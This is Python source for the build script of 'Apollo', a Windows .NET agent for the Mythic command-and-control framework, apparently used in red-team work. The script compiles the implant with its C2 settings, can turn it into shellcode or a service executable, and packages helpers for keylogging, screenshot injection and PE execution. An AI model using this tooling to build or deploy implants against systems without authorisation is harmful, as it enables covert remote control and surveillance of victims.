import datetime
import time

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
import os, fnmatch, tempfile, sys, asyncio
from distutils.dir_util import copy_tree
from mythic_container.MythicGoRPC.send_mythic_rpc_callback_next_checkin_range import *
import traceback
import shutil
import json
import pathlib
from mythic_container.MythicRPC import *


class Apollo(PayloadType):
    name = "apollo"
    file_extension = "exe"
    author = "@djhohnstein"
    mythic_encrypts = True
    supported_os = [
        SupportedOS.Windows
    ]
    version = "2.2.19"
    wrapper = False
    wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
    note = """
A fully featured .NET 4.0 compatible training agent. Version: {}
    """.format(version)
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["WinExe", "Shellcode", "Service"],
            default_value="WinExe",
            description="Output as shellcode, executable, or service.",
        )
    ]
    c2_profiles = ["http", "smb", "tcp", "websocket"]
    agent_path = pathlib.Path(".") / "apollo" / "mythic"
    agent_code_path = pathlib.Path(".") / "apollo" / "agent_code"
    agent_icon_path = agent_path / "agent_functions" / "apollo.svg"
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Copying files to temp location"),
        BuildStep(step_name="Compiling", step_description="Compiling with nuget and dotnet"),
        BuildStep(step_name="Donut", step_description="Converting to Shellcode"),
        BuildStep(step_name="Creating Service", step_description="Creating Service EXE from Shellcode")
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        # debugging
        # resp.status = BuildStatus.Success
        # return resp
        #end debugging
        defines_commands_upper = [f"#define {x.upper()}" for x in self.commands.get_commands()]
        special_files_map = {
            "Config.cs": {
                "payload_uuid": self.uuid,
            },
        }
        extra_variables = {

        }
        success_message = f"Apollo {self.uuid} Successfully Built"
        stdout_err = ""
        defines_profiles_upper = []

        if len(set([info.get_c2profile()["is_p2p"] for info in self.c2info])) > 1:
            resp.set_status(BuildStatus.Error)
            resp.set_build_message("Cannot mix egress and P2P C2 profiles")
            return resp

        for c2 in self.c2info:
            profile = c2.get_c2profile()
            defines_profiles_upper.append(f"#define {profile['name'].upper()}")
            for key, val in c2.get_parameters_dict().items():
                prefixed_key = f"{profile['name'].lower()}_{key}"

                if isinstance(val, dict) and 'enc_key' in val:
                    if val["value"] == "none":
                        resp.set_status(BuildStatus.Error)
                        resp.set_build_message("Apollo does not support plaintext encryption")
                        return resp

                    stdout_err += "Setting {} to {}".format(prefixed_key, val["enc_key"] if val["enc_key"] is not None else "")

                    # TODO: Prefix the AESPSK variable and also make it specific to each profile
                    special_files_map["Config.cs"][key] = val["enc_key"] if val["enc_key"] is not None else ""
                elif isinstance(val, str):
                    special_files_map["Config.cs"][prefixed_key] = val
                elif isinstance(val, bool):
                    if key == "encrypted_exchange_check" and not val:
                        resp.set_status(BuildStatus.Error)
                        resp.set_build_message(f"Encrypted exchange check needs to be set for the {profile['name']} C2 profile")
                        return resp

                    special_files_map["Config.cs"][prefixed_key] = "T" if val else "F"
                elif isinstance(val, dict):
                    extra_variables = {**extra_variables, **val}
                else:
                    special_files_map["Config.cs"][prefixed_key] = json.dumps(val)
        try:
            # make a temp directory for it to live
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            # shutil to copy payload files over
            copy_tree(str(self.agent_code_path), agent_build_path.name)
            # first replace everything in the c2 profiles
            for csFile in get_csharp_files(agent_build_path.name):
                templateFile = open(csFile, "rb").read().decode()
                templateFile = templateFile.replace("#define C2PROFILE_NAME_UPPER", "\n".join(defines_profiles_upper))
                templateFile = templateFile.replace("#define COMMAND_NAME_UPPER", "\n".join(defines_commands_upper))
                for specialFile in special_files_map.keys():
                    if csFile.endswith(specialFile):
                        for key, val in special_files_map[specialFile].items():
                            templateFile = templateFile.replace(key + "_here", val)
                        if specialFile == "Config.cs":
                            if len(extra_variables.keys()) > 0:
                                extra_data = ""
                                for key, val in extra_variables.items():
                                    extra_data += "                        { \"" + key + "\", \"" + val + "\" },\n"
                                templateFile = templateFile.replace("HTTP_ADDITIONAL_HEADERS_HERE", extra_data)
                            else:
                                templateFile = templateFile.replace("HTTP_ADDITIONAL_HEADERS_HERE", "")
                with open(csFile, "wb") as f:
                    f.write(templateFile.encode())
            command = f"dotnet build -c release -p:Platform=\"Any CPU\" -o {agent_build_path.name}/Release/"
            #command = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release -p:Platform=\"Any CPU\""
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))
            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            if stdout:
                stdout_err += f'\n[stdout]\n{stdout.decode()}\n'
            if stderr:
                stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
            output_path = f"{agent_build_path.name}/Release/Apollo.exe"

            if os.path.exists(output_path):
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout="Successfully compiled payload",
                    StepSuccess=True
                ))
                resp.status = BuildStatus.Success
                targetExeAsmPath = "/srv/ExecuteAssembly.exe"
                targetPowerPickPath = "/srv/PowerShellHost.exe"
                targetScreenshotInjectPath = "/srv/ScreenshotInject.exe"
                targetKeylogInjectPath = "/srv/KeylogInject.exe"
                targetExecutePEPath = "/srv/ExecutePE.exe"
                targetInteropPath = "/srv/ApolloInterop.dll"
                targetRunOfPath = "/srv/RunOF.dll"
                shutil.move("{}/Release/ExecuteAssembly.exe".format(agent_build_path.name), targetExeAsmPath)
                shutil.move("{}/Release/PowerShellHost.exe".format(agent_build_path.name), targetPowerPickPath)
                shutil.move("{}/Release/ScreenshotInject.exe".format(agent_build_path.name), targetScreenshotInjectPath)
                shutil.move("{}/Release/KeylogInject.exe".format(agent_build_path.name), targetKeylogInjectPath)
                shutil.move("{}/Release/ExecutePE.exe".format(agent_build_path.name), targetExecutePEPath)
                shutil.move("{}/Release/ApolloInterop.dll".format(agent_build_path.name), targetInteropPath)
                shutil.move("{}/Release/RunOF.dll".format(agent_build_path.name), targetRunOfPath)
                if self.get_parameter('output_type') == "WinExe":
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Donut",
                        StepStdout="Not converting to Shellcode through donut, passing through.",
                        StepSuccess=True
                    ))
                    resp.payload = open(output_path, 'rb').read()
                    resp.build_message = success_message
                    resp.status = BuildStatus.Success
                    resp.build_stdout = stdout_err
                else:

                    shellcode_path = "{}/loader.bin".format(agent_build_path.name)
                    donutPath = os.path.abspath(self.agent_code_path / "donut")
                    command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                                 stderr=asyncio.subprocess.PIPE)
                    stdout, stderr = await proc.communicate()

                    command = "{} -x3 -k2 -i {}".format(donutPath, output_path)
                    # need to go through one more step to turn our exe into shellcode
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                                 stderr=asyncio.subprocess.PIPE,
                                                                 cwd=agent_build_path.name)
                    stdout, stderr = await proc.communicate()

                    stdout_err += f'[stdout]\n{stdout.decode()}\n'
                    stdout_err += f'[stderr]\n{stderr.decode()}'

                    if not os.path.exists(shellcode_path):
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Donut",
                            StepStdout=f"Failed to pass through donut:\n{command}\n{stdout_err}",
                            StepSuccess=False
                        ))
                        resp.build_message = "Failed to create shellcode"
                        resp.status = BuildStatus.Error
                        resp.payload = b""
                        resp.build_stderr = stdout_err
                    else:
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Donut",
                            StepStdout=f"Successfully passed through donut:\n{command}",
                            StepSuccess=True
                        ))
                        if self.get_parameter('output_type') == "Shellcode":
                            resp.payload = open(shellcode_path, 'rb').read()
                            resp.build_message = success_message
                            resp.status = BuildStatus.Success
                            resp.build_stdout = stdout_err
                        else:
                            # we're generating a service executable
                            working_path = (
                                pathlib.PurePath(agent_build_path.name)
                                / "Service"
                                / "WindowsService1"
                                / "Resources"
                                / "loader.bin"
                            )
                            shutil.move(shellcode_path, working_path)
                            command = f"dotnet build -c release -p:OutputType=WinExe -p:Platform=\"Any CPU\""
                            proc = await asyncio.create_subprocess_shell(
                                command,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.PIPE,
                                cwd=pathlib.PurePath(agent_build_path.name) / "Service",
                            )
                            stdout, stderr = await proc.communicate()
                            if stdout:
                                stdout_err += f"[stdout]\n{stdout.decode()}"
                            if stderr:
                                stdout_err += f"[stderr]\n{stderr.decode()}"
                            output_path = (
                                pathlib.PurePath(agent_build_path.name)
                                / "Service"
                                / "WindowsService1"
                                / "bin"
                                / "Release"
                                / "net451"
                                / "WindowsService1.exe"
                            )
                            output_path = str(output_path)
                            if os.path.exists(output_path):
                                resp.payload = open(output_path, "rb").read()
                                resp.status = BuildStatus.Success
                                resp.build_message = "New Service Executable created!"
                                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                                    PayloadUUID=self.uuid,
                                    StepName="Creating Service",
                                    StepStdout=stdout_err,
                                    StepSuccess=True
                                ))
                            else:
                                resp.payload = b""
                                resp.status = BuildStatus.Error
                                resp.build_stderr = stdout_err + "\n" + output_path
                                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                                    PayloadUUID=self.uuid,
                                    StepName="Creating Service",
                                    StepStdout=stdout_err,
                                    StepSuccess=False
                                ))

            else:
                # something went wrong, return our errors
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=stdout_err,
                    StepSuccess=False
                ))
                resp.status = BuildStatus.Error
                resp.payload = b""
                resp.build_message = "Unknown error while building payload. Check the stderr for this build."
                resp.build_stderr = stdout_err
        except Exception as e:
            resp.payload = b""
            resp.status = BuildStatus.Error
            resp.build_message = "Error building payload: " + str(traceback.format_exc())
        #await asyncio.sleep(10000)
        return resp

    async def check_if_callbacks_alive(self,
                                       message: PTCheckIfCallbacksAliveMessage) -> PTCheckIfCallbacksAliveMessageResponse:
        response = PTCheckIfCallbacksAliveMessageResponse(Success=True)
        for callback in message.Callbacks:
            if callback.SleepInfo == "":
                continue  # can't do anything if we don't know the expected sleep info of the agent
            try:
                sleep_info = json.loads(callback.SleepInfo)
            except Exception as e:
                continue
            atLeastOneCallbackWithinRange = False
            try:
                for activeC2, info in sleep_info.items():
                    if activeC2 == "websocket" and callback.LastCheckin == "1970-01-01 00:00:00Z":
                        atLeastOneCallbackWithinRange = True
                        continue
                    checkinRangeResponse = await SendMythicRPCCallbackNextCheckinRange(
                        MythicRPCCallbackNextCheckinRangeMessage(
                            LastCheckin=callback.LastCheckin,
                            SleepJitter=info["jitter"],
                            SleepInterval=info["interval"],
                        ))
                    if not checkinRangeResponse.Success:
                        continue
                    lastCheckin = datetime.datetime.strptime(callback.LastCheckin, '%Y-%m-%dT%H:%M:%S.%fZ')
                    minCheckin = datetime.datetime.strptime(checkinRangeResponse.Min, '%Y-%m-%dT%H:%M:%S.%fZ')
                    maxCheckin = datetime.datetime.strptime(checkinRangeResponse.Max, '%Y-%m-%dT%H:%M:%S.%fZ')
                    if minCheckin <= lastCheckin <= maxCheckin:
                        atLeastOneCallbackWithinRange = True
                response.Callbacks.append(PTCallbacksToCheckResponse(
                    ID=callback.ID,
                    Alive=atLeastOneCallbackWithinRange,
                ))
            except Exception as e:
                logger.info(e)
                logger.info(callback.to_json())
        return response


def get_csharp_files(base_path: str) -> list[str]:
    results = []
    for root, dirs, files in os.walk(base_path):
        for name in files:
            if fnmatch.fnmatch(name, "*.cs"):
                results.append(os.path.join(root, name))
    if len(results) == 0:
        raise Exception("No payload files found with extension .cs")
    return results
